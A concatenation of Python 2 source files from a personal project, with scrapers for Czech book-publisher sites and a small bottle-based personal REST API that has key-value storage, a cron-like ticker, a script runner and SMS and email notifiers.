	b.cost  = ch.getVisibleText(dom.find("p", {"class":"cenatext"})[0].getContent()).replace("&nbsp;", " ")
	
	for i in dom.find("table", {"class":"tabulka-info"})[0].find("tr"):
		if "Autor" in i.getContent():
			b.author = ch.getVisibleText(i.getContent()).replace("\n", "").replace("Autor:", "")
			break
	
	print b#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""

by Bystroushaak (bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
from httpkie import Downloader
import dhtmlparser as d



#= Variables ==================================================================
URL = "http://shop.ben.cz/cz/kategorie/novinky/knihy-za-posledni-tri-mesice-pouze-ben-technicka-literatura.aspx"



#= Functions & objects ========================================================
def getBooks():
	downer = Downloader()
	data = downer.download(URL)

	dom = d.parseString(data)

	books = []
	for html_chunk in dom.find("div", {"class": "seznamKniha"}):
		book = {}

		# name is separated by ":" from author
		name = html_chunk.find("a")[0].params["title"]
		if ":" in name:
			book["author"] = name.split(":")[0].strip()
			book["name"]   = "".join(name.split(":")[1:]).strip()
		else:
			book["name"] = name

		book["url"]   = html_chunk.find("a")[0].params["href"]
		book["cost"]  = html_chunk.find("p", {"class": "seznamCena"})[0]\
		                          .find("strong")[0].getContent().split("Kč")[0]\
		                          .strip()

		descr = downer.download(html_chunk.find("a")[0].params["href"])
		descr = d.parseString(descr.decode("utf-8").encode("utf-8"))  # it works :D
		descr = descr.find("div", {"class": "detailPopis"})[0]
		descr = str(descr).split("<ol>")[0]
		descr = descr.split("</table>")[1] if "</table>" in descr else descr
		book["descr"] = d.removeTags(descr).strip()

		books.append(book)

	return books


#= Main program ===============================================================
if __name__ == '__main__':
	print getBooks()[0]["descr"]

# TODO:
# serializace do jsonu jen při spuštění
# unittest nějak.. (sekce seznamKniha by tam měla být vždy, ne?)#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# self xml-serialization class v1.0.0 (29.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
# Notes:
    # 
import dhtmlparser as d

class Book:
	def __init__(self):
		self.oldself = dir(self)
		self.oldself.append("oldself")
	
	def __str__(self):
		childs = []
		
		for i in filter(lambda x: x not in self.oldself, dir(self)):
			childs.append(d.HTMLElement('<' + i + '>', [d.HTMLElement(eval("self." + str(i)))]))
		
		return d.HTMLElement("", [ d.HTMLElement("<book>", childs) ]).prettify()#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
# Notes:
    # 
import book






#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# grada.cz checker v1.0.0 (28.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import dhtmlparser as d
import CheckerTools as ch
from api.book import Book

data = unicode(ch.getPage("http://www.grada.cz/rss/rss.xml"), "windows-1250").encode("utf-8")


#= Main program ================================================================
for book in d.parseString(data).find("item"):
	if len(book.find("title")) == 0:
		continue
	
	b = Book()
	b.name = book.find("title")[0].getContent().strip()
	b.url = book.find("link")[0].getContent().strip()
	
	data = unicode(ch.getPage(b.url), "windows-1250").encode("utf-8")
	
	b.author = filter(lambda x: "Autor:" in x, data.splitlines())
	if len(b.author) > 0:
		b.author = ch.getVisibleText(b.author[0]).replace("Autor:", "")
	
	dom     = d.parseString(data)
	b.cost  = ch.getVisibleText(dom.find("div", {"class":"prices"})[0].getContent()).replace("Cena:", "").replace("Kč", "").strip()
	b.descr = ch.getVisibleText(dom.find("div", {"class":"content"})[0].getContent())
	
	print b
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# ben.cz checker v1.0.0 (28.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import CheckerTools as ch
import dhtmlparser as d
from api.book import Book


#= Main program ================================================================
ben = ch.getPage("http://shop.ben.cz/cz/kategorie/novinky/knihy-za-posledni-tri-mesice-pouze-ben-technicka-literatura.aspx")

books = []
for book in d.parseString(ben).find("div", {"class":"seznamKniha"}):
	b = Book()
	
	# name is separated by ":" from author
	name = book.find("a")[0].params["title"]
	if ":" in name: 
		b.author = name.split(":")[0].strip()
		b.name   = "".join(name.split(":")[1:]).strip()
	else:
		b.name   = name
		b.author = ""
	
	b.url    = book.find("a")[0].params["href"]
	b.cost   = book.find("p", {"class": "seznamCena"})[0].find("strong")[0].getContent().split("Kč")[0].strip()
	b.descr  = ch.getVisibleText((d.parseString(ch.getPage(book.find("a")[0].params["href"])).find("div", {"class":"detailPopis"})[0].prettify().split("<ol>")[0]))
	
	print b






#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# cpress.cz checker v1.0.0 (28.03.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import dhtmlparser as d
import CheckerTools as ch
from api.book import Book


#= Main program ================================================================
for url in ["http://knihy.cpress.cz/?p=news", "http://knihy.cpress.cz/?p=news&page=2", "http://knihy.cpress.cz/?p=news&page=3"]:
	for book in d.parseString(ch.getPage(url)).find("div", {"class":"polozka"}):
		b = Book()
		
		b.name   = book.find("h4")[0].childs[0].getContent()
		b.url    = book.find("h4")[0].childs[0].params["href"].strip()
		try:
			b.author = book.find("a", {"class":"autor"})[0].getContent()
		except IndexError:
			b.author = "Kolektiv"
		b.cost   = book.find("div", {"class":"cena"})[0].find("span")[0].getContent()
		
		try:
			b.descr = d.parseString(ch.getPage(b.url)).find("meta", {"name":"description"})[0].params["content"]
		except IndexError:
			try:
				b.descr = ch.getVisibleText(d.parseString(ch.getPage(b.url)).find("div", {"id":"zalozka1"})[0].getContent())
			except IndexError:
				b.descr = "none"
		
		print b#! /usr/bin/env python
# -*- coding: utf-8 -*-
import os
import os.path

from setuptools import setup, find_packages


version = '0.1.0'
long_description = ""
# long_description = "\n\n".join([
#     open('README.rst').read(),
#     open('CONTRIBUTORS.rst').read(),
#     open('CHANGES.rst').read()
# ])


# SSL Cert:
# openssl genrsa 1024 > host.key
# chmod 400 host.key
# openssl req -new -x509 -nodes -sha1 -days 365 -key host.key > host.cert
# cat host.cert host.key > host.pem
# chmod 400 host.pem


setup(
    name='personalAPI',
    version=version,
    description="Just my own, personal API.",
    long_description=long_description,
    url='https://bitbucket.org/Bystroushaak/personal-api',

    author='Bystroushaak',
    author_email='bystrousak@kitakitsune.org',

    classifiers=[
        "Programming Language :: Python :: 2.7",
        "License :: Other/Proprietary License",
    ],
    license='proprietary software',

    packages=find_packages(exclude=['ez_setup']),

    include_package_data=True,
    zip_safe=True,
    install_requires=open("requirements.rst").readlines()
)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
#
# Imports =====================================================================
import os.path

import functools
from bottle import request, HTTPError


# Functions ===================================================================
def unittest_template(getter, tests):
    data = getter()

    try:
        for i, test in enumerate(tests):
            assert test(data), "Test number " + str(i) + " failed!"
    except AssertionError, e:
        return {
            "status": False,
            "error": str(e)
        }

    return {"status": True}


def get_base_route():
    dirname = os.path.dirname(__file__)

    return "/%s/" % os.path.basename(dirname)


def sources_group(username, password):
    return True


def auth_basic(check, realm="private", text="Access denied"):
    """
    Callback decorator to require HTTP basic auth.

    Created issue to integrate this:
        https://github.com/bottlepy/bottle/issues/706

    TODO: In case of issue rejection, integrate this into bottle-rest package.
    """
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            username, password = request.auth or (None, None)

            if not check(username, password):
                err = HTTPError(401, text)
                err.add_header('WWW-Authenticate', 'Basic realm="%s"' % realm)
                raise err

            return func(*args, **kwargs)
        return wrapper
    return decorator
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Interpreter version: python 2.7
#
"""
Shaddack API for retreiving links to Shaddack's projects published at his site
(see BASE_URL).
"""
# Imports =====================================================================
from bottle import route, run
from bottle_rest import pretty_dump

from __init__ import unittest_template, get_base_route
# from __init__ import auth_basic, sources_group  # authorization


import dhtmlparser
from httpkie import Downloader


# Variables ===================================================================
BASE_URL = "http://shaddack.twibright.com/"
BASE_ROUTE = get_base_route()
downer = Downloader()


# Functions & objects =========================================================
def parseLinks():
    """
    Parse links at shaddack's page and return them in simple dictionary.

    Yields:
        dict: {url: .., title: .., content: ..}
    """
    for link in dhtmlparser.parseString(downer.download(BASE_URL)).find("a"):
        if "href" not in link.params:
            continue

        href = link.params["href"]

        # get absolute url
        if "://" not in href:
            href = BASE_URL + href

        title = link.params["title"].strip() if "title" in link.params else ""

        title = dhtmlparser.removeTags(title).strip()
        content = dhtmlparser.removeTags(link).strip()

        # skip links with blank content
        if content == "":
            continue

        yield {
            "url": href,
            "title": title,
            "description": content
        }


@route(BASE_ROUTE + "shaddack")
# @auth_basic(sources_group)
@pretty_dump
def shaddack():
    """
    Returns:
        list: of Shaddack's projects.

    See /shaddack/_schema for description of datastructures.
    """
    return {
        "base_url": BASE_URL,
        "links": [x for x in parseLinks()]
    }


@route(BASE_ROUTE + "shaddack/_schema")
# @auth_basic(sources_group)
@pretty_dump
def schema():
    return {
        "/shaddack": {
            "base_url": "http://string",
            "links": [{
                "url": "string",
                "title": "string",
                "description": "string"
            }]
        }
    }


@route(BASE_ROUTE + "shaddack/_unittest")
# @auth_basic(sources_group)
@pretty_dump
def unittest():
    return unittest_template(
        lambda: [x for x in parseLinks()],
        [
            lambda d: len(d) > 0,
            lambda d: all(map(lambda x: x["url"].startswith("http"), d)),
            lambda d: len(
                filter(
                    lambda x: "Hardware project" in x["title"],
                    d
                )
            ) > 0
        ]
    )


# Main program ================================================================
if __name__ == '__main__':
    run(host='localhost', port=8080, debug=True, reloader=True)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Interpreter version: python 2.7
#
"""
API for retreiving informations about interpreter's Albums from last.fm.
"""
# Imports =====================================================================
import urllib
from string import Template

import dhtmlparser
from httpkie import Downloader
from bottle import route, run, abort
from bottle_rest import pretty_dump

from __init__ import unittest_template, get_base_route
# from __init__ import auth_basic, sources_group  # authorization


# Variables ===================================================================
BASE_URL     = "http://www.last.fm"
URL_TEMPLATE = BASE_URL + "/music/$INTERPRETER/+albums"
BASE_ROUTE   = get_base_route()


# Functions & objects =========================================================
def parseAlbums(interpreter):
    """
    Yields:
        dict: {name: "str", url: "str"}
    """
    interpreter = urllib.quote_plus(interpreter)

    # download data
    downer = Downloader()
    dom = dhtmlparser.parseString(
        downer.download(
            Template(URL_TEMPLATE).substitute(INTERPRETER=interpreter)
        )
    )

    for link in dom.find("a"):
        if "href" in link.params and \
           link.params["href"].startswith("/music/" + interpreter + "/"):
            if link.params["href"].startswith("/music/" + interpreter + "/+"):
                continue

            album = dhtmlparser.removeTags(link).strip()

            if album == "":
                continue

            yield {
                "name": album,
                "url": BASE_URL + link.params["href"]
            }


@route(BASE_ROUTE + "last_fm/<interpreter>")
# @auth_basic(sources_group)
@pretty_dump
def lastfm(interpreter):
    """
    Get list of albums for given `interpreter`.

    Args:
        interpreter (str): interpreters name.

    Returns:
        dict: list of album names and links to them.
    """
    if interpreter is None:
        abort(
            501,
            pretty_dump({
                "error": {
                    "text": "You will have to specify interpreter!"
                },
                "example": "GET /last_fm/Austra"
            })
        )

    if interpreter == "_unittest":
        return unittest()
    if interpreter == "_schema":
        return schema()

    return {
        "interpreter": interpreter,
        "url": Template(URL_TEMPLATE).substitute(
            INTERPRETER=urllib.quote_plus(interpreter)
        ),
        "albums": [x for x in parseAlbums(interpreter)]
    }


@route(BASE_ROUTE + "last_fm/_schema")
# @auth_basic(sources_group)
@pretty_dump
def schema():
    return {
        "/last_fm": [
            {
                "error": {"text": "string"},
                "example": "string"
            },
            {
                "interpreter": "string",
                "url": "http://string",
                "albums": [{
                    "name": "string",
                    "url": "http://string"
                }]
            }
        ]
    }


@route(BASE_ROUTE + "last_fm/_unittest")
# @auth_basic(sources_group)
@pretty_dump
def unittest():
    return unittest_template(
        lambda: [x for x in parseAlbums("Austra")],
        [
            lambda d: len(d) > 0,
            lambda d: all(map(lambda x: x["url"].startswith("http"), d)),
            lambda d: len(filter(lambda x: "Olympia" in x["name"], d)) > 0
        ]
    )


# Main program ================================================================
if __name__ == '__main__':
    run(host='localhost', port=8080, debug=True, reloader=True)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
hysteria.sk updates parser.
"""
# Imports =====================================================================
from bottle import route, run
from bottle_rest import pretty_dump

import dhtmlparser
from httpkie import Downloader

from __init__ import unittest_template, get_base_route
# from __init__ import auth_basic, sources_group  # authorization


# Variables ===================================================================
BASE_URL = "http://hysteria.sk/"
BASE_ROUTE = get_base_route()


# Functions & objects =========================================================
def removeTags(s):
    return dhtmlparser.removeTags(dhtmlparser.parseString(s))


def parseLinks():
    downer = Downloader()

    data = downer.download(BASE_URL).replace("\n", " ")
    for line in data.split("<br>"):
        line = line.strip()
        if not line.startswith("<b>"):
            continue

        date, content = map(lambda x: x.strip(), line.split("-", 1))

        yield {
            "date": removeTags(date),
            "content": content
        }


@route(BASE_ROUTE + "hysteria.sk")
# @auth_basic(sources_group)
@pretty_dump
def hysteria():
    """
    Return list of news from hysteria.sk page.
    """
    return {
        "url": BASE_URL,
        "messages": [x for x in parseLinks()]
    }


@route(BASE_ROUTE + "hysteria.sk/_schema")
# @auth_basic(sources_group)
@pretty_dump
def schema():
    return {
        "/hysteria.sk": {
            "url": "http://string",
            "messages": [{
                "date": "dd.mm.yyyy",
                "content": "string"
            }]
        }
    }


@route(BASE_ROUTE + "hysteria.sk/_unittest")
# @auth_basic(sources_group)
@pretty_dump
def unittest():
    return unittest_template(
        lambda: [x for x in parseLinks()],
        [
            lambda d: len(d) > 0,
            lambda d: all(map(lambda x: "." in x["date"], d)),
            lambda d: len(filter(lambda x: "CZ ebook" in x["content"], d)) > 0,
            lambda d: len(filter(lambda x: "10.04.12" in x["date"], d)) > 0
        ]
    )


# Main program ================================================================
if __name__ == '__main__':
    run(host='localhost', port=8080, debug=True, reloader=True)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
"""
Module is containing all necessary global variables for the package.

Module also has the ability to read user-defined data from two paths:

- ``$HOME/_SETTINGS_PATH``
- ``/etc/_SETTINGS_PATH``

See :attr:`._SETTINGS_PATH` for details.

Note:
    If the first path is found, other is ignored.

Example of the configuration file (``$HOME/.pAPI/settings.json``)::

    {
        "NOTIFICATORS_SMS_USERNAME": "username",
        "NOTIFICATORS_SMS_PASSWORD": "password"
    }

Attributes
----------
"""
# Imports =====================================================================
import json
import os
import os.path

from os.path import dirname, normpath


# Module configuration ========================================================
#: Global configuration options
ADDRESS = "127.0.0.1"
PORT = 8888
URL = "http://%s:%d" % (ADDRESS, PORT)


#: Configuration of the SMS notificator.
NOTIFICATORS_SMS_USERNAME = ""
NOTIFICATORS_SMS_PASSWORD = ""

#: Configuration of the Email notificator
NOTIFICATORS_EMAIL_ADDRESS = ""
NOTIFICATORS_EMAIL_PORT = 0
NOTIFICATORS_EMAIL_USERNAME = ""
NOTIFICATORS_EMAIL_PASSWORD = ""

#: Runner
RUNNER_SCRIPT_PATH = normpath(dirname(__file__) + "/../scripts")

DATABASE_PATH = normpath(dirname(__file__) + "/../database")


# User configuration reader (don't edit this ==================================
_ALLOWED = [str, unicode, int, float]

_SETTINGS_PATH = ".pAPI/settings.json"
"""
Path which is appended to default search paths (``$HOME`` and ``/etc``).

Note:
    It has to start with ``/``. Variable is **appended** to the default search
    paths, so this doesn't mean, that the path is absolute!
"""


def get_all_constants():
    """
    Get list of all uppercase, non-private globals (doesn't start with ``_``).

    Returns:
        list: Uppercase names defined in `globals()` (variables from this \
              module).
    """
    return filter(
        lambda key: key.upper() == key and type(globals()[key]) in _ALLOWED,

        # filter _PRIVATE variables
        filter(
            lambda x: not x.startswith("_"),
            globals()
        )
    )


def substitute_globals(config_dict):
    """
    Set global variables to values defined in `config_dict`.

    Args:
        config_dict (dict): dictionary with data, which are used to set \
                            `globals`.

    Note:
        `config_dict` have to be dictionary, or it is ignored. Also all
        variables, that are not already in globals, or are not types defined in
        :attr:`_ALLOWED` (str, int, float) or starts with ``_`` are silently
        ignored.
    """
    constants = get_all_constants()

    if type(config_dict) != dict:
        return

    for key in config_dict:
        if key in constants and type(config_dict[key]) in _ALLOWED:
            globals()[key] = config_dict[key]


# try to read data from configuration paths ($HOME/_SETTINGS_PATH,
# /etc/_SETTINGS_PATH)
_home = os.environ.get("HOME", None)
_home_path = os.path.join(_home, _SETTINGS_PATH)
_etc_path = os.path.join("/etc", _SETTINGS_PATH)

_read_path = None
if _home and os.path.exists(_home_path):
    _read_path = _home_path
elif os.path.exists(_etc_path):
    _read_path = _etc_path

if _read_path:
    with open(_read_path) as f:
        substitute_globals(
            json.loads(f.read())
        )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json


# Variables ===================================================================



# Functions & classes =========================================================
class Message(object):
    def __init__(self, priority, subject, content):
        self.priority = priority
        self.subject = subject
        self.content = content

    def _get_class_name(self):
        return self.__class__.split(".")[-1]

    def _to_dict(self):
        return {
            "__class__": self._get_class_name(),
            "__value__": self.__dict__
        }

    def to_json(self):
        return json.dumps(
            self._to_dict(),
            indent=2
        )

    def from_json(json_obj):
        if "__class__" in json_obj:
            if json_obj["__class__"] == self._get_class_name():
                return Message(**json_obj["__value__"])
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
Key-val storage wrapper over reddis.
"""
# Imports =====================================================================
import json

from bottle_rest import json_to_params, pretty_dump
from bottle import post, get, delete

from ..shared import database_decorator

from __init__ import URL_PREFIX


# Variables ===================================================================
SERVICE_URL = URL_PREFIX + "/" + "key_val"

# database connection
DB_FN = "./key_val_db.sqlite"
DB_TABLE = "ticker"


# Functions & classes =========================================================
@post(SERVICE_URL)
@database_decorator(filename=DB_FN, table=DB_TABLE)
@json_to_params
def save(db, key, val):
    """
    To `key` save `val`.
    """
    db[key] = val


@get(SERVICE_URL)
@database_decorator(filename=DB_FN, table=DB_TABLE)
@json_to_params
def load(db, key):
    """
    Load value of `key`.
    """
    return db.get(key, None)


@delete(SERVICE_URL)
@database_decorator(filename=DB_FN, table=DB_TABLE)
@json_to_params
def delete_key(db, key):
    """
    Remove `key` from database.
    """
    del db[key]


@get(SERVICE_URL + "/keys")
@database_decorator(filename=DB_FN, table=DB_TABLE)
@pretty_dump
def list(db):
    """
    List all keys in database.
    """
    return db.keys()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
Cron-like module providing ability to "tick" given URL by given HTTP method at
given time.
"""
# Imports =====================================================================
import time
import json
import os.path
from functools import wraps

import requests

from crontab import CronTab
from sqlitedict import SqliteDict

from attribute_wrapper import JSONWrapper
from bottle_rest import json_to_params, pretty_dump
from bottle import get, post, put, delete, HTTPError

from .. import settings
from ..shared import database_decorator

from __init__ import URL_PREFIX


# Variables ===================================================================
pAPI = JSONWrapper(settings.URL)

SERVICE_URL = URL_PREFIX + "/ticker"

DB_FN = "./ticker_db.sqlite"
DB_TABLE = "ticker"
TICKS_KEY = "__TICKS"


# Functions & objects =========================================================
def get_tickable_urls(DB):
    """
    Go thru database, return list of tickable URLs.
    """
    # first time checking
    if TICKS_KEY not in DB:
        DB[TICKS_KEY] = {}
        return filter(lambda x: x != TICKS_KEY, DB.keys())

    # not yet ticked
    tickable = []
    unticked = set(filter(lambda x: x != TICKS_KEY, DB.keys()))
    ticked = set(DB[TICKS_KEY].keys())
    tickable = list(set(unticked) - set(ticked))

    # check all tickers, which were at least once used
    for url, next_tick in DB[TICKS_KEY].items():
        if time.time() >= next_tick:
            tickable.append(url)

    return tickable


def next_cron_tick(time_str):
    """
    Convert cron-like time line to number of seconds to next tick.
    """
    return CronTab(time_str).next()


def update_all(DB):
    """
    Tick all update-able URLs.
    """
    for url in get_tickable_urls(DB):
        per = DB[url]["period"]
        data = DB[url]["data"]
        method = DB[url]["method"]

        # actually tick the url
        if "://" in url:
            requests.request(method, url, data=json.dumps(data))
        else:
            # not so nice use of attribute_wrapper, but I want it this way
            # because in this case, there is only one place handling the
            # requests, so if I would need to change something, it would be
            # easy
            local_pointer = pAPI._(url)
            local_sender = getattr(local_pointer, method)

            # don't let the HTTPErrors fuck whole queue
            try:
                local_sender(**data)
            except requests.exceptions.HTTPError, e:
                print e

        # schedule next tick
        DB[TICKS_KEY][url] = time.time()
        DB[TICKS_KEY][url] += next_cron_tick(per) if DB[url]["cron"] else per


def add_periodic(period, method, data):
    """
    Convert arguments to structure which is then stored in database.
    """
    cron = False
    try:
        period = int(period)
    except ValueError:
        cron = True

    return {
        "period": period,
        "method": method,
        "data": data,
        "cron": cron
    }


# API =========================================================================
@get(SERVICE_URL)
@database_decorator(filename=DB_FN, table=DB_TABLE)
@pretty_dump
def get_records(db):
    """
    Return list of active tasks.

    Format::

        {
            url: {
                "period": int(n),
                "method": "GET/POST/HEAD"
            }
        }

    Also run the check for active tasks and tick them.
    """
    update_all(db)
    return dict(
        filter(
            lambda x: x[0] != TICKS_KEY,
            db.items()
        )
    )


@post(SERVICE_URL)
@database_decorator(filename=DB_FN, table=DB_TABLE)
@json_to_params
def add_record(db, period, url, method, data=None):
    """
    Add new periodic ticker call.

    This function doesn't update the record, if it already exists.

    Args:
        period (int/str): period in second or cron-like line
        url (str): URL of the page, which will be touched.
        method (str): GET/POST/HEAD
        data (dict, default None): Optional data which will be sen't to `url`.
    """
    if url not in db:
        db[url] = add_periodic(period, method, data)


@put(SERVICE_URL)
@database_decorator(filename=DB_FN, table=DB_TABLE)
@json_to_params
def update_record(db, period, url, method, data=None):
    """
    Update or create new record. Use this, if you want to be sure, that record
    was updated / added.

    Args:
        url (str): URL of the page, which will be touched.
        period (int): period in second or cron-like line
        method (str): GET/POST/HEAD
        data (dict, default None): Optional data which will be sen't to `url`.
    """
    db[url] = add_periodic(period, method, data)


@delete(SERVICE_URL)
@database_decorator(filename=DB_FN, table=DB_TABLE)
@json_to_params
def delete_record(db, url):
    if url not in db:
        return HTTPError("Unknown url!")

    if url == TICKS_KEY:
        HTTPError("This url is not allowed!")

    # remove from db
    del db[url]
    if url in db[TICKS_KEY]:
        del db[TICKS_KEY][url]

    return url


@get(SERVICE_URL + "/_schema")
@pretty_dump
def schema():
    return {
        # TODO: add schema of the communication
    }
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
Proscannuje všechny programy v zadaném adresáři (scripts/).
Nacpe je do tickeru přes runner.

Opakovat každých 10m.


# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json

from attribute_wrapper import JSONWrapper

from bottle_rest import json_to_params
from bottle import get

from .. import settings
from __init__ import URL_PREFIX


# Variables ===================================================================
pAPI = JSONWrapper(settings.URL)

DB_PREFIX = "deduplicator/"
SERVICE_URL = URL_PREFIX + "/" + "deduplicator"


# Functions & classes =========================================================
@get(SERVICE_URL)
@json_to_params
def deduplicate_list(cache_name, seq):
    """
    From input sequence `seq` return only values, that are not already in
    cache `cache_name`.
    """
    db_key = DB_PREFIX + cache_name.__str__()
    cache = pAPI.core.key_val.get(key=db_key)

    # key_val storage returns None for nonexisting keys and that is not
    # itterable
    if not cache:
        cache = []

    new_data = filter(
        lambda x: x not in cache,
        seq
    )

    # save results
    if new_data:
        pAPI.core.key_val.post(key=db_key, val=new_data)

    return new_data
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Variables ===================================================================
URL_PREFIX = "/core"#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from bottle import route, request
from bottle_rest import json_to_params

from __init__ import URL_PREFIX


# Functions & classes =========================================================
@route(URL_PREFIX + "/" + "echolink")
@json_to_params
def echolink(*args, **kwargs):
    """
    Simply return sent data as dict with info about used HTTP method.
    """
    return {
        "method": request.method,
        "args": args,
        "kwargs": kwargs
    }
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
# Dostává jako parametr cestu k programu, který spustí.

# Pokud cesta neexisituje, přes referer ho odhlásí (settings volba? nebo předaný
# parametr?).
# 
# -> Fuck, ticker používá jen url pro ID, nedá se to tedy jednoduše odstranit :S

import os
import os.path
import json

import sh
from bottle_rest import json_to_params
from bottle import get, HTTPError

from ..settings import RUNNER_SCRIPT_PATH
from __init__ import URL_PREFIX


# Variables ===================================================================
SERVICE_URL = URL_PREFIX + "/runner"


# Functions & classes =========================================================
def unsubscribe(path, data):
    pass


@get(SERVICE_URL)
@json_to_params
def runner(path, data=None):
    """
    Run script at `path`. Add it optional `data` to stdin (serialized to JSON).

    `path` have to be in ``settings.RUNNER_SCRIPT_PATH``.
    """
    path = os.path.join(
        RUNNER_SCRIPT_PATH,
        os.path.normpath(path)
    )

    if not path.startswith(RUNNER_SCRIPT_PATH):
        unsubscribe(path, data)
        raise HTTPError(400, "The '%s' path is not allowed." % path)

    if not os.path.exists(path):
        unsubscribe(path, data)
        raise HTTPError(400, "The '%s' path doesn't exists." % path)

    # serialize data again
    if data is not None:
        data = json.dumps(data)

    output = sh.Command(path)(_in=data)

    # try to deserialize output
    try:
        return json.loads(output)
    except ValueError:
        pass

    return str(output)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from bottle_rest import json_to_params
from bottle import post, response, HTTPError

import smssluzbacz_api
from smssluzbacz_api.lite import SmsGateApi

from ..settings import NOTIFICATORS_SMS_USERNAME, NOTIFICATORS_SMS_PASSWORD
from __init__ import URL_PREFIX


# Functions & objects =========================================================
@post(URL_PREFIX + "/sms")
@json_to_params
def send(number, message):
    api_handler = SmsGateApi(
        NOTIFICATORS_SMS_USERNAME,
        NOTIFICATORS_SMS_PASSWORD,
        timeout=2,
        use_ssl=True
    )

    try:
        api_handler.send(number, message)
    except smssluzbacz_api.Error as e:
        raise HTTPError(400, e.__class__.__name__ + ": " + e.message)

    response.status_code = 201
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Variables ===================================================================
URL_PREFIX = "/notificators"#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import base64

from sender import Mail, Message, Attachment

from bottle import post
from bottle_rest import json_to_params

from ..settings import NOTIFICATORS_EMAIL_ADDRESS
from ..settings import NOTIFICATORS_EMAIL_PORT
from ..settings import NOTIFICATORS_EMAIL_USERNAME
from ..settings import NOTIFICATORS_EMAIL_PASSWORD
from __init__ import URL_PREFIX


# Functions & objects =========================================================
@post(URL_PREFIX + "/email")
@json_to_params
def send(To, Subject, Body, Html=None, Attachments=[], Charset="utf-8"):
    """
    Send email to `To` address with `Subject` and `Body`. `Html`, `Attachments`
    and `Charset` (default ``utf-8``) are optional.

    `Attachments` is expected to be list of tuples ``(name, mime, b64_data)``.
    """
    # server details
    mail = Mail(
        NOTIFICATORS_EMAIL_ADDRESS,
        port=NOTIFICATORS_EMAIL_PORT,
        username=NOTIFICATORS_EMAIL_USERNAME,
        password=NOTIFICATORS_EMAIL_PASSWORD,
        use_tls=False,
        use_ssl=True,
    )

    # construct message
    msg = Message(Subject)
    msg.fromaddr = ("pAPI Notificator", NOTIFICATORS_EMAIL_USERNAME)
    msg.to = To
    msg.body = Body
    msg.html = Html
    msg.charset = Charset

    # attach files
    for name, mime, data in Attachments:
        msg.attach(
            Attachment(name, mime, base64.b64decode(data))
        )

    mail.send(msg)

    return True
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os.path
from functools import wraps

from sqlitedict import SqliteDict

from . import settings


# Variables ===================================================================


# Functions & classes =========================================================
def database_decorator(fn=None, filename="default.sqlite", table="default"):
    """
    Open connection to the database and offer it to the wrapped function.

    So far, there is no database, only primitive JSON load/store system.
    """
    def database_decorator_wrapper(fn):
        @wraps(fn)
        def database_wrapper(*args, **kwargs):
            path = filename
            if not os.path.isabs(path):
                path = os.path.join(settings.DATABASE_PATH, path)

            # load database
            db = SqliteDict(
                path,
                # autocommit=True
            )

            # load table
            table_ref = db.get(table, {})

            # put table to function parameters
            kwargs["db"] = table_ref

            out = fn(*args, **kwargs)

            # save database
            db[table] = table_ref
            db.commit()

            return out

        return database_wrapper

    if fn:  # python decorator with optional parameters bukkake
        return database_decorator_wrapper(fn)

    return database_decorator_wrapper
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



